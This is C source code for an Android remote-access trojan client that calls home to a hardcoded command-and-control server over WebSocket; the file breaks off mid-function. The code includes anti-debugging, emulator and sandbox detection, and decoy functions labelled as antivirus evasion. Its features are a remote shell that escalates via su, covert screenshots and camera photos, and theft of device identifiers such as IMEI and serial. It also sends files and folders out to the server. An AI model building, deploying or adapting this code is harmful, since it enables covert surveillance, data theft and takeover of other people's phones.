/*
 * Android Client for WebSocket C2 Server
 * Connects to server.py via WebSocket
 * 
 * Compile with Android NDK:
 * $NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android21-clang client_android.c -o client_android -lpthread
 * 
 * Or for older devices (32-bit ARM):
 * $NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/armv7a-linux-androideabi21-clang client_android.c -o client_android -lpthread
 * 
 * Push to device: adb push client_android /data/local/tmp/
 * Run: adb shell /data/local/tmp/client_android
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/sysinfo.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <dirent.h>
#include <pwd.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <stdarg.h>

#define BUFFER_SIZE 65536
#define RECONNECT_DELAY 5
#define PING_INTERVAL 10

// ============== CONFIGURATION ==============
// Change these to your server
char g_server_host[256] = "api.root1.me";
char g_server_port[6] = "80";
char g_server_path[256] = "/";

// Global variables
int g_sock = -1;
char g_hostname[256];
char g_username[256];
char g_client_id[64];  // Unique client identifier (persisted)
char g_current_dir[4096];
volatile int g_connected = 0;
volatile int g_should_exit = 0;
int g_session_id = 0;
time_t g_last_ping_time = 0;
int g_is_rooted = 0;

// Ping thread state
static pthread_t g_ping_thread;
static volatile int g_ping_running = 0;

// Camera state
static int g_current_camera = 0;   // 0 = back, 1 = front
static int g_num_cameras = 2;       // Usually 2 on phones

// ============== AV EVASION ==============

// Decoy functions to look like a legitimate app
__attribute__((unused)) static void update_battery_status() {
    FILE* f = fopen("/sys/class/power_supply/battery/capacity", "r");
    if (f) { char buf[32]; fgets(buf, 32, f); fclose(f); }
}

__attribute__((unused)) static void check_network_status() {
    struct hostent* host = gethostbyname("google.com");
    (void)host;
}

__attribute__((unused)) static void get_device_model() {
    FILE* f = fopen("/system/build.prop", "r");
    if (f) { char buf[256]; fgets(buf, 256, f); fclose(f); }
}

__attribute__((unused)) static int sync_preferences() {
    return access("/data/data", F_OK);
}

// Anti-debug: Check if being traced
static int check_debugger() {
    // Method 1: Check TracerPid in /proc/self/status
    FILE* f = fopen("/proc/self/status", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "TracerPid:", 10) == 0) {
                int tracer = atoi(line + 10);
                fclose(f);
                if (tracer != 0) return 1;
                break;
            }
        }
        fclose(f);
    }
    
    // Method 2: Try ptrace on self (fails if already being traced)
    if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
        return 1;
    }
    ptrace(PTRACE_DETACH, 0, NULL, NULL);
    
    return 0;
}

// Check if running in emulator
static int check_emulator() {
    // Check for emulator-specific files
    const char* emu_files[] = {
        "/dev/socket/qemud",
        "/dev/qemu_pipe",
        "/system/lib/libc_malloc_debug_qemu.so",
        "/sys/qemu_trace",
        "/system/bin/qemu-props",
        "/dev/goldfish_pipe"
    };
    
    for (int i = 0; i < 6; i++) {
        if (access(emu_files[i], F_OK) == 0) {
            return 1;
        }
    }
    
    // Check build.prop for emulator indicators
    FILE* f = fopen("/system/build.prop", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, "generic") || strstr(line, "goldfish") ||
                strstr(line, "sdk") || strstr(line, "emulator") ||
                strstr(line, "Andy") || strstr(line, "Genymotion") ||
                strstr(line, "vbox") || strstr(line, "nox")) {
                fclose(f);
                return 1;
            }
        }
        fclose(f);
    }
    
    // Check ro.hardware via getprop
    FILE* fp = popen("getprop ro.hardware 2>/dev/null", "r");
    if (fp) {
        char buf[64];
        if (fgets(buf, sizeof(buf), fp)) {
            if (strstr(buf, "goldfish") || strstr(buf, "ranchu") || strstr(buf, "vbox")) {
                pclose(fp);
                return 1;
            }
        }
        pclose(fp);
    }
    
    return 0;
}

// Check for analysis/security tools
static int check_analysis_tools() {
    // Check for common analysis apps
    const char* packages[] = {
        "de.robv.android.xposed",
        "com.saurik.substrate",
        "de.robv.android.xposed.installer",
        "com.android.vending.billing.InAppBillingService.COIN",
        "com.chelpus.lackypatch",
        "com.dimonvideo.luckypatcher",
        "com.koushikdutta.rommanager",
        "com.koushikdutta.superuser",
        "eu.chainfire.supersu",
        "com.topjohnwu.magisk",
        "org.proxydroid",
        "de.robv.android.xposed.mods.redclock",
        "com.devadvance.rootcloak",
        "com.devadvance.rootcloakplus",
        "com.android.vending.billing.InAppBillingService.LUCK"
    };
    
    for (int i = 0; i < 15; i++) {
        char cmd[256];
        snprintf(cmd, sizeof(cmd), "pm path %s 2>/dev/null | head -1", packages[i]);
        FILE* fp = popen(cmd, "r");
        if (fp) {
            char buf[256];
            if (fgets(buf, sizeof(buf), fp) && strlen(buf) > 5) {
                pclose(fp);
                return 1;  // Found analysis tool
            }
            pclose(fp);
        }
    }
    
    // Check for frida server
    FILE* fp = popen("ps 2>/dev/null | grep -i frida", "r");
    if (fp) {
        char buf[256];
        if (fgets(buf, sizeof(buf), fp) && strstr(buf, "frida")) {
            pclose(fp);
            return 1;
        }
        pclose(fp);
    }
    
    // Check for common debugging ports
    fp = popen("netstat -ln 2>/dev/null | grep -E ':27042|:27043'", "r");
    if (fp) {
        char buf[256];
        if (fgets(buf, sizeof(buf), fp) && strlen(buf) > 5) {
            pclose(fp);
            return 1;  // Frida default ports
        }
        pclose(fp);
    }
    
    return 0;
}

// Timing check (sandboxes often speed up sleep)
static int check_timing() {
    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);
    
    usleep(100000);  // Sleep 100ms
    
    clock_gettime(CLOCK_MONOTONIC, &end);
    
    long elapsed = (end.tv_sec - start.tv_sec) * 1000 + 
                   (end.tv_nsec - start.tv_nsec) / 1000000;
    
    // If sleep was way too fast (< 50ms), we might be in sandbox
    if (elapsed < 50) {
        return 1;
    }
    
    return 0;
}

// Check system resources (sandboxes often have low resources)
static int check_resources() {
    struct sysinfo si;
    if (sysinfo(&si) == 0) {
        // Less than 1GB RAM is suspicious for modern Android
        if (si.totalram < 1073741824UL) {
            return 1;
        }
    }
    
    // Check number of CPU cores
    int cores = sysconf(_SC_NPROCESSORS_ONLN);
    if (cores < 2) {
        return 1;
    }
    
    return 0;
}

// Run all anti-analysis checks
static int run_evasion_checks() {
    int suspicious = 0;
    
    // Check for debugger
    if (check_debugger()) {
        suspicious += 3;  // High weight
    }
    
    // Check for emulator
    if (check_emulator()) {
        suspicious += 2;  // Medium weight - some devs use emulators
    }
    
    // Check timing
    if (check_timing()) {
        suspicious += 3;  // High weight
    }
    
    // Check resources
    if (check_resources()) {
        suspicious += 1;  // Low weight
    }
    
    // Check analysis tools (async to not block)
    // Only do heavy check sometimes
    static int check_count = 0;
    if (++check_count % 5 == 0) {
        if (check_analysis_tools()) {
            suspicious += 2;
        }
    }
    
    // Threshold: don't be too aggressive
    // Return 1 if score >= 4 (likely sandbox/analysis)
    return suspicious >= 4;
}

// Delayed start with jitter
static void delayed_start() {
    // Random delay between 2-7 seconds
    srand(time(NULL) ^ getpid());
    int delay = 2 + (rand() % 5);
    sleep(delay);
}

// Base64 encoding table
static const char base64_chars[] = 
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

void base64_encode(const unsigned char* input, int length, char* output) {
    int i = 0, j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];
    
    while (length--) {
        char_array_3[i++] = *(input++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            
            for(i = 0; i < 4; i++)
                output[j++] = base64_chars[char_array_4[i]];
            i = 0;
        }
    }
    
    if (i) {
        for(int k = i; k < 3; k++)
            char_array_3[k] = '\0';
        
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        
        for (int k = 0; k < i + 1; k++)
            output[j++] = base64_chars[char_array_4[k]];
        
        while(i++ < 3)
            output[j++] = '=';
    }
    output[j] = '\0';
}

void generate_websocket_key(char* key) {
    unsigned char random_bytes[16];
    srand(time(NULL) ^ getpid());
    
    for (int i = 0; i < 16; i++) {
        random_bytes[i] = rand() % 256;
    }
    
    base64_encode(random_bytes, 16, key);
}

int websocket_handshake() {
    char key[32];
    char request[1024];
    char response[4096];
    
    generate_websocket_key(key);
    
    snprintf(request, sizeof(request),
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Key: %s\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "User-Agent: Mozilla/5.0 (Linux; Android) AppleWebKit/537.36\r\n"
        "\r\n",
        g_server_path, g_server_host, key);
    
    if (send(g_sock, request, strlen(request), 0) <= 0) {
        return 0;
    }
    
    int received = recv(g_sock, response, sizeof(response) - 1, 0);
    if (received <= 0) {
        return 0;
    }
    
    response[received] = '\0';
    
    if (strstr(response, "101") == NULL || strstr(response, "Switching Protocols") == NULL) {
        return 0;
    }
    
    return 1;
}

void create_websocket_frame(const char* data, int len, unsigned char* frame, int* frame_len) {
    int pos = 0;
    
    frame[pos++] = 0x81;
    
    if (len < 126) {
        frame[pos++] = 0x80 | len;
    } else if (len < 65536) {
        frame[pos++] = 0x80 | 126;
        frame[pos++] = (len >> 8) & 0xFF;
        frame[pos++] = len & 0xFF;
    } else {
        frame[pos++] = 0x80 | 127;
        for (int i = 7; i >= 0; i--) {
            frame[pos++] = (len >> (i * 8)) & 0xFF;
        }
    }
    
    unsigned char mask[4];
    for (int i = 0; i < 4; i++) {
        mask[i] = rand() % 256;
        frame[pos++] = mask[i];
    }
    
    for (int i = 0; i < len; i++) {
        frame[pos++] = data[i] ^ mask[i % 4];
    }
    
    *frame_len = pos;
}

int send_websocket_data(const char* data, int len) {
    if (g_sock < 0 || !g_connected) return 0;
    
    int max_frame_size = len + 14;
    unsigned char* frame = malloc(max_frame_size);
    if (!frame) return 0;
    
    int frame_len;
    create_websocket_frame(data, len, frame, &frame_len);
    
    int sent = send(g_sock, frame, frame_len, 0);
    free(frame);
    
    return sent > 0;
}

int parse_websocket_frame(unsigned char* data, int len, char* output, int* output_len) {
    if (len < 2) return 0;
    
    int pos = 0;
    unsigned char first_byte = data[pos++];
    unsigned char second_byte = data[pos++];
    
    int opcode = first_byte & 0x0F;
    int masked = (second_byte & 0x80) != 0;
    long payload_len = second_byte & 0x7F;
    
    if (payload_len == 126) {
        if (len < 4) return 0;
        payload_len = (data[pos] << 8) | data[pos + 1];
        pos += 2;
    } else if (payload_len == 127) {
        if (len < 10) return 0;
        payload_len = 0;
        for (int i = 0; i < 8; i++) {
            payload_len = (payload_len << 8) | data[pos + i];
        }
        pos += 8;
    }
    
    unsigned char mask[4] = {0};
    if (masked) {
        if (len < pos + 4) return 0;
        memcpy(mask, data + pos, 4);
        pos += 4;
    }
    
    if (len < pos + payload_len) return 0;
    
    // Handle ping
    if (opcode == 0x09) {
        unsigned char pong[256];
        int pong_len;
        pong[0] = 0x8A;
        pong[1] = 0x80 | (payload_len & 0x7F);
        unsigned char pong_mask[4];
        for (int i = 0; i < 4; i++) {
            pong_mask[i] = rand() % 256;
            pong[2 + i] = pong_mask[i];
        }
        for (int i = 0; i < payload_len && i < 125; i++) {
            pong[6 + i] = data[pos + i] ^ pong_mask[i % 4];
        }
        pong_len = 6 + (payload_len < 125 ? payload_len : 125);
        send(g_sock, pong, pong_len, 0);
        *output_len = 0;
        return pos + payload_len;
    }
    
    // Handle close
    if (opcode == 0x08) {
        g_connected = 0;
        *output_len = 0;
        return pos + payload_len;
    }
    
    // Copy payload
    for (int i = 0; i < payload_len; i++) {
        if (masked)
            output[i] = data[pos + i] ^ mask[i % 4];
        else
            output[i] = data[pos + i];
    }
    output[payload_len] = '\0';
    *output_len = payload_len;
    
    return pos + payload_len;
}

void send_websocket_ping() {
    if (g_sock < 0 || !g_connected) return;
    
    unsigned char ping_frame[6];
    ping_frame[0] = 0x89;
    ping_frame[1] = 0x80;
    for (int i = 0; i < 4; i++) {
        ping_frame[2 + i] = rand() % 256;
    }
    send(g_sock, ping_frame, 6, 0);
}

// Generate or load unique client ID (persisted in hidden file)
void init_client_id() {
    char id_file[256] = "/data/local/tmp/.client_id";
    
    // Try to read existing ID
    FILE* f = fopen(id_file, "r");
    if (f) {
        if (fgets(g_client_id, 32, f)) {
            g_client_id[strcspn(g_client_id, "\n")] = 0;
            if (strlen(g_client_id) >= 16) {
                fclose(f);
                return;
            }
        }
        fclose(f);
    }
    
    // Generate new unique ID based on Android ID + random
    char android_id[64] = "";
    FILE* fp = popen("settings get secure android_id 2>/dev/null", "r");
    if (fp) {
        fgets(android_id, sizeof(android_id), fp);
        android_id[strcspn(android_id, "\n")] = 0;
        pclose(fp);
    }
    
    // Hash android_id to get a stable component
    unsigned long hash = 5381;
    for (int i = 0; android_id[i]; i++) {
        hash = ((hash << 5) + hash) + android_id[i];
    }
    
    snprintf(g_client_id, sizeof(g_client_id), "%08lX%08lX%08lX%04X",
             hash,
             (unsigned long)time(NULL),
             (unsigned long)getpid(),
             (unsigned int)(rand() & 0xFFFF));
    
    // Save for persistence
    f = fopen(id_file, "w");
    if (f) {
        fprintf(f, "%s\n", g_client_id);
        fclose(f);
    }
}

void* ping_thread_func(void* arg) {
    while (g_ping_running && g_connected) {
        sleep(PING_INTERVAL);
        if (g_connected) {
            send_websocket_ping();
        }
    }
    return NULL;
}

int connect_to_server() {
    struct addrinfo hints, *result, *rp;
    
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    
    if (getaddrinfo(g_server_host, g_server_port, &hints, &result) != 0) {
        return 0;
    }
    
    for (rp = result; rp != NULL; rp = rp->ai_next) {
        g_sock = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (g_sock < 0) continue;
        
        // Socket optimizations for better performance
        int flag = 1;
        setsockopt(g_sock, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag));
        
        int buf_size = 262144;  // 256KB buffers
        setsockopt(g_sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
        setsockopt(g_sock, SOL_SOCKET, SO_RCVBUF, &buf_size, sizeof(buf_size));
        
        if (connect(g_sock, rp->ai_addr, rp->ai_addrlen) == 0) {
            break;
        }
        
        close(g_sock);
        g_sock = -1;
    }
    
    freeaddrinfo(result);
    
    if (g_sock < 0) return 0;
    
    if (!websocket_handshake()) {
        close(g_sock);
        g_sock = -1;
        return 0;
    }
    
    g_connected = 1;
    return 1;
}

void cleanup_socket() {
    if (g_sock >= 0) {
        close(g_sock);
        g_sock = -1;
    }
    g_connected = 0;
}

// ============== ANDROID SPECIFIC FUNCTIONS ==============

int check_root() {
    // Check for su binary
    const char* su_paths[] = {
        "/system/xbin/su",
        "/system/bin/su",
        "/sbin/su",
        "/data/local/xbin/su",
        "/data/local/bin/su",
        "/data/local/su",
        "/su/bin/su",
        NULL
    };
    
    for (int i = 0; su_paths[i] != NULL; i++) {
        if (access(su_paths[i], F_OK) == 0) {
            return 1;
        }
    }
    
    return 0;
}

char* get_android_prop(const char* prop) {
    static char value[256];
    char cmd[512];
    
    snprintf(cmd, sizeof(cmd), "getprop %s 2>/dev/null", prop);
    FILE* fp = popen(cmd, "r");
    if (fp) {
        if (fgets(value, sizeof(value), fp)) {
            value[strcspn(value, "\n")] = 0;
            pclose(fp);
            return value;
        }
        pclose(fp);
    }
    return "";
}

// ============== SCREENSHOT ==============
void take_screenshot() {
    char temp_file[256] = "/data/local/tmp/.screenshot.png";
    char cmd[512];
    
    // Try screencap (requires shell or root)
    snprintf(cmd, sizeof(cmd), "screencap -p '%s' 2>/dev/null", temp_file);
    int ret = system(cmd);
    
    FILE* f = fopen(temp_file, "rb");
    if (!f) {
        send_websocket_data("[!] Screenshot failed - need shell/root permissions\n", 52);
        return;
    }
    
    fseek(f, 0, SEEK_END);
    long file_size = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    if (file_size <= 0 || file_size > 50 * 1024 * 1024) {
        fclose(f);
        unlink(temp_file);
        send_websocket_data("[!] Screenshot file invalid\n", 28);
        return;
    }
    
    unsigned char* data = malloc(file_size);
    if (!data) {
        fclose(f);
        unlink(temp_file);
        send_websocket_data("[!] Memory allocation failed\n", 29);
        return;
    }
    
    fread(data, 1, file_size, f);
    fclose(f);
    unlink(temp_file);
    
    int b64_size = ((file_size + 2) / 3) * 4 + 1;
    char* b64_data = malloc(b64_size);
    if (!b64_data) {
        free(data);
        send_websocket_data("[!] Memory allocation failed\n", 29);
        return;
    }
    
    base64_encode(data, file_size, b64_data);
    free(data);
    
    char header[128];
    snprintf(header, sizeof(header), "<<<SCREENSHOT_PNG>>>%ld<<<DATA>>>", file_size);
    send_websocket_data(header, strlen(header));
    
    int b64_len = strlen(b64_data);
    int sent = 0;
    int chunk_size = 4096;
    
    while (sent < b64_len && g_connected) {
        int to_send = (b64_len - sent < chunk_size) ? (b64_len - sent) : chunk_size;
        send_websocket_data(b64_data + sent, to_send);
        sent += to_send;
        usleep(10000);
    }
    
    free(b64_data);
    
    send_websocket_data("<<<SCREENSHOT_END>>>", 20);
    send_websocket_data("\n[+] Screenshot captured\n", 25);
}

// ============== CAMERA FUNCTIONS ==============

// List available cameras
void list_cameras() {
    char msg[1024];
    send_websocket_data("\n[*] Available cameras:\n", 24);
    
    // On Android, camera IDs are typically:
    // 0 = Back camera (main)
    // 1 = Front camera (selfie)
    
    snprintf(msg, sizeof(msg), "  [0] Back Camera (Main)");
    if (g_current_camera == 0) strcat(msg, " <- SELECTED");
    strcat(msg, "\n");
    send_websocket_data(msg, strlen(msg));
    
    snprintf(msg, sizeof(msg), "  [1] Front Camera (Selfie)");
    if (g_current_camera == 1) strcat(msg, " <- SELECTED");
    strcat(msg, "\n");
    send_websocket_data(msg, strlen(msg));
    
    // Try to get more camera info via dumpsys
    FILE* fp = popen("dumpsys media.camera 2>/dev/null | grep -E 'Camera [0-9]|facing' | head -10", "r");
    if (fp) {
        char line[256];
        int found_extra = 0;
        while (fgets(line, sizeof(line), fp)) {
            if (!found_extra) {
                send_websocket_data("\n[*] Camera details:\n", 21);
                found_extra = 1;
            }
            send_websocket_data("  ", 2);
            send_websocket_data(line, strlen(line));
        }
        pclose(fp);
    }
    
    send_websocket_data("\n[*] Use 'selectcam 0' (back) or 'selectcam 1' (front)\n", 55);
}

// Select a camera
void select_camera(int index) {
    char msg[256];
    
    if (index < 0 || index > 1) {
        snprintf(msg, sizeof(msg), "[!] Invalid camera. Use 0 (back) or 1 (front).\n");
        send_websocket_data(msg, strlen(msg));
        return;
    }
    
    g_current_camera = index;
    snprintf(msg, sizeof(msg), "[+] Selected camera %d: %s\n", index, 
        index == 0 ? "Back Camera" : "Front Camera");
    send_websocket_data(msg, strlen(msg));
}

// Take a camera photo
void take_camshot() {
    send_websocket_data("[*] Capturing camera photo...\n", 30);
    
    char temp_file[256] = "/data/local/tmp/.camshot.jpg";
    char cmd[512];
    int success = 0;
    
    // Method 1: Using am broadcast (works on some devices)
    // This requires Camera app to be available
    snprintf(cmd, sizeof(cmd),
        "am broadcast -a android.media.action.IMAGE_CAPTURE "
        "--ez android.intent.extra.quickCapture true "
        "--ei cameraid %d 2>/dev/null",
        g_current_camera);
    system(cmd);
    usleep(2000000);  // Wait 2 seconds for capture
    
    // Try to find the most recent photo
    FILE* fp = popen("ls -t /sdcard/DCIM/Camera/*.jpg 2>/dev/null | head -1", "r");
    if (fp) {
        char photo_path[256] = "";
        if (fgets(photo_path, sizeof(photo_path), fp)) {
            photo_path[strcspn(photo_path, "\n")] = 0;
            if (strlen(photo_path) > 0) {
                // Copy to our temp file
                snprintf(cmd, sizeof(cmd), "cp '%s' '%s' 2>/dev/null", photo_path, temp_file);
                if (system(cmd) == 0 && access(temp_file, R_OK) == 0) {
                    success = 1;
                }
            }
        }
        pclose(fp);
    }
    
    // Method 2: Using screenrecord with --output-format=raw and ffmpeg (rooted)
    if (!success && g_is_rooted) {
        // Try using hw camera service directly (very device specific)
        snprintf(cmd, sizeof(cmd),
            "am start -a android.media.action.STILL_IMAGE_CAMERA 2>/dev/null");
        system(cmd);
        usleep(3000000);
        
        // Take screenshot of camera viewfinder as fallback
        snprintf(cmd, sizeof(cmd), "screencap -p '%s' 2>/dev/null", temp_file);
        if (system(cmd) == 0 && access(temp_file, R_OK) == 0) {
            // Close camera app
            system("am force-stop com.android.camera 2>/dev/null");
            system("am force-stop com.google.android.GoogleCamera 2>/dev/null");
            success = 1;
        }
    }
    
    // Method 3: Termux API if available
    if (!success) {
        snprintf(cmd, sizeof(cmd),
            "termux-camera-photo -c %d '%s' 2>/dev/null",
            g_current_camera, temp_file);
        if (system(cmd) == 0 && access(temp_file, R_OK) == 0) {
            success = 1;
        }
    }
    
    if (!success) {
        send_websocket_data("[!] Camera capture failed. Try:\n", 32);
        send_websocket_data("    - Termux: pkg install termux-api && termux-setup-storage\n", 61);
        send_websocket_data("    - Or use screenshot command while camera app is open\n", 57);
        return;
    }
    
    // Read the captured image
    FILE* f = fopen(temp_file, "rb");
    if (!f) {
        send_websocket_data("[!] Failed to read captured image\n", 34);
        return;
    }
    
    fseek(f, 0, SEEK_END);
    long file_size = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    if (file_size <= 0 || file_size > 10 * 1024 * 1024) {
        fclose(f);
        unlink(temp_file);
        send_websocket_data("[!] Captured image invalid\n", 27);
        return;
    }
    
    unsigned char* data = malloc(file_size);
    if (!data) {
        fclose(f);
        unlink(temp_file);
        send_websocket_data("[!] Memory allocation failed\n", 29);
        return;
    }
    
    fread(data, 1, file_size, f);
    fclose(f);
    unlink(temp_file);
    
    // Base64 encode
    int b64_size = ((file_size + 2) / 3) * 4 + 1;
    char* b64_data = malloc(b64_size);
    if (!b64_data) {
        free(data);
        send_websocket_data("[!] Memory allocation failed\n", 29);
        return;
    }
    
    base64_encode(data, file_size, b64_data);
    free(data);
    
    // Send with CAMSHOT markers
    char header[256];
    snprintf(header, sizeof(header), "<<<CAMSHOT_START>>>640|480|%ld<<<DATA_START>>>", file_size);
    send_websocket_data(header, strlen(header));
    
    // Send in chunks
    int b64_len = strlen(b64_data);
    int sent = 0;
    int chunk_size = 1024;
    
    while (sent < b64_len && g_connected) {
        int to_send = (b64_len - sent < chunk_size) ? (b64_len - sent) : chunk_size;
        send_websocket_data(b64_data + sent, to_send);
        sent += to_send;
        usleep(30000);
    }
    
    free(b64_data);
    
    usleep(150000);
    send_websocket_data("<<<CAMSHOT_END>>>", 17);
    usleep(50000);
    
    char msg[128];
    snprintf(msg, sizeof(msg), "\n[+] Camera photo captured (%s camera)\n",
        g_current_camera == 0 ? "back" : "front");
    send_websocket_data(msg, strlen(msg));
}

// ============== DEVICE INFO ==============
void send_device_info() {
    char info[8192];
    
    char* model = get_android_prop("ro.product.model");
    char* brand = get_android_prop("ro.product.brand");
    char* device = get_android_prop("ro.product.device");
    char* android_ver = get_android_prop("ro.build.version.release");
    char* sdk = get_android_prop("ro.build.version.sdk");
    char* serial = get_android_prop("ro.serialno");
    char* imei = get_android_prop("ro.ril.oem.imei");
    
    // Get battery info
    char battery[32] = "Unknown";
    FILE* f = fopen("/sys/class/power_supply/battery/capacity", "r");
    if (f) {
        if (fgets(battery, sizeof(battery), f)) {
            battery[strcspn(battery, "\n")] = 0;
            strcat(battery, "%");
        }
        fclose(f);
    }
    
    // Get IP address
    char ip[64] = "Unknown";
    FILE* fp = popen("ip route get 1 2>/dev/null | awk '{print $7}' | head -1", "r");
    if (fp) {
        if (fgets(ip, sizeof(ip), fp)) {
            ip[strcspn(ip, "\n")] = 0;
        }
        pclose(fp);
    }
    
    // Get installed packages count
    int pkg_count = 0;
    fp = popen("pm list packages 2>/dev/null | wc -l", "r");
    if (fp) {
        char buf[32];
        if (fgets(buf, sizeof(buf), fp)) {
            pkg_count = atoi(buf);
        }
        pclose(fp);
    }
    
    snprintf(info, sizeof(info),
        "\n=== Android Device Information ===\n"
        "Model: %s %s (%s)\n"
        "Android Version: %s (SDK %s)\n"
        "ClientID: %s\n"
        "Serial: %s\n"
        "IMEI: %s\n"
        "Battery: %s\n"
        "IP Address: %s\n"
        "Rooted: %s\n"
        "Installed Apps: %d\n"
        "Current Dir: %s\n"
        "==================================\n\n",
        brand, model, device,
        android_ver, sdk,
        g_client_id,
        strlen(serial) > 0 ? serial : "Unknown",
        strlen(imei) > 0 ? imei : "Unknown",
        battery,
        ip,
        g_is_rooted ? "Yes" : "No",
        pkg_count,
        g_current_dir
    );
    
    send_websocket_data(info, strlen(info));
}

// ============== SHELL SESSION ==============
void shell_session() {
    send_websocket_data("[*] Starting shell session. Type 'exit' to return.\n", 51);
    
    char buffer[BUFFER_SIZE];
    char output[BUFFER_SIZE];
    
    while (g_connected && !g_should_exit) {
        int len = recv(g_sock, buffer, sizeof(buffer) - 1, 0);
        if (len <= 0) break;
        
        int cmd_len;
        char cmd[BUFFER_SIZE];
        parse_websocket_frame((unsigned char*)buffer, len, cmd, &cmd_len);
        
        if (cmd_len <= 0) continue;
        
        while (cmd_len > 0 && (cmd[cmd_len-1] == '\n' || cmd[cmd_len-1] == '\r')) {
            cmd[--cmd_len] = '\0';
        }
        
        if (strcmp(cmd, "exit") == 0) {
            send_websocket_data("[*] Exiting shell\n", 18);
            break;
        }
        
        // Try with su if rooted
        char full_cmd[BUFFER_SIZE + 32];
        if (g_is_rooted) {
            snprintf(full_cmd, sizeof(full_cmd), "su -c '%s' 2>&1", cmd);
        } else {
            snprintf(full_cmd, sizeof(full_cmd), "%s 2>&1", cmd);
        }
        
        FILE* fp = popen(full_cmd, "r");
        if (!fp) {
            send_websocket_data("[!] Command execution failed\n", 29);
            continue;
        }
        
        while (fgets(output, sizeof(output), fp) != NULL) {
            send_websocket_data(output, strlen(output));
        }
        
        pclose(fp);
    }
}

// ============== PROCESS LIST ==============
void list_processes() {
    char header[] = "\nPID\tNAME\n----\t----\n";
    send_websocket_data(header, strlen(header));
    
    FILE* fp = popen("ps -A 2>/dev/null || ps 2>/dev/null", "r");
    if (!fp) {
        send_websocket_data("[!] Cannot list processes\n", 26);
        return;
    }
    
    char line[512];
    // Skip header
    fgets(line, sizeof(line), fp);
    
    while (fgets(line, sizeof(line), fp)) {
        send_websocket_data(line, strlen(line));
    }
    
    pclose(fp);
    send_websocket_data("\n", 1);
}

// ============== FILE DOWNLOAD ==============
void download_file(const char* filename) {
    FILE* f = fopen(filename, "rb");
    if (!f) {
        char msg[512];
        snprintf(msg, sizeof(msg), "[!] Cannot open file: %s\n", filename);
        send_websocket_data(msg, strlen(msg));
        return;
    }
    
    fseek(f, 0, SEEK_END);
    long file_size = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    if (file_size <= 0 || file_size > 100 * 1024 * 1024) {
        fclose(f);
        send_websocket_data("[!] File empty or too large (>100MB)\n", 37);
        return;
    }
    
    unsigned char* data = malloc(file_size);
    if (!data) {
        fclose(f);
        send_websocket_data("[!] Memory allocation failed\n", 29);
        return;
    }
    
    fread(data, 1, file_size, f);
    fclose(f);
    
    const char* basename = strrchr(filename, '/');
    basename = basename ? basename + 1 : filename;
    
    int b64_size = ((file_size + 2) / 3) * 4 + 1;
    char* b64_data = malloc(b64_size);
    if (!b64_data) {
        free(data);
        send_websocket_data("[!] Memory allocation failed\n", 29);
        return;
    }
    
    base64_encode(data, file_size, b64_data);
    free(data);
    
    char header[512];
    snprintf(header, sizeof(header), "<<<FILE_START>>>%s|%ld<<<DATA>>>", basename, file_size);
    send_websocket_data(header, strlen(header));
    
    int b64_len = strlen(b64_data);
    int sent = 0;
    int chunk_size = 4096;
    
    while (sent < b64_len && g_connected) {
        int to_send = (b64_len - sent < chunk_size) ? (b64_len - sent) : chunk_size;
        send_websocket_data(b64_data + sent, to_send);
        sent += to_send;
        usleep(10000);
    }
    
    free(b64_data);
    
    send_websocket_data("<<<FILE_END>>>", 14);
    
    char msg[512];
    snprintf(msg, sizeof(msg), "\n[+] File sent: %s (%ld bytes)\n", basename, file_size);
    send_websocket_data(msg, strlen(msg));
}

// ============== FOLDER DOWNLOAD ==============
void download_folder(const char* foldername) {
    // Clean path
    char clean_name[4096];
    const char* start = foldername;
    while (*start == ' ' || *start == '\t') start++;
    strncpy(clean_name, start, sizeof(clean_name) - 1);
    clean_name[sizeof(clean_name) - 1] = '\0';
    int len = strlen(clean_name);
    while (len > 0 && (clean_name[len-1] == ' ' || clean_name[len-1] == '\t' ||
                       clean_name[len-1] == '/')) {
        clean_name[--len] = '\0';
    }
    
    // Check if directory exists
    struct stat st;
    if (stat(clean_name, &st) != 0 || !S_ISDIR(st.st_mode)) {
        send_websocket_data("[!] Folder not found\n", 21);
        return;
    }
    
    send_websocket_data("[*] Compressing folder...\n", 26);
    
    // Create temp tar.gz file
    char temp_zip[256];
    snprintf(temp_zip, sizeof(temp_zip), "/data/local/tmp/.folder_%d.tar.gz", getpid());
    
    char cmd[4096];
